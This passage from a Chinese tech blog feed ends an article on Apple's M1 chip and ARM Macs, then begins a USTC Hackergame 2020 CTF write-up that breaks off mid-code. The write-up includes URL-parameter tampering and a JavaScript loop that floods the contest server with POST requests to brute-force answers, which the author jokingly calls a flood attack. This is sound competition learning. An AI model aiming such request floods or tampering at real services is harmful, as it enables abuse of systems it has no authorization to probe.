post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span 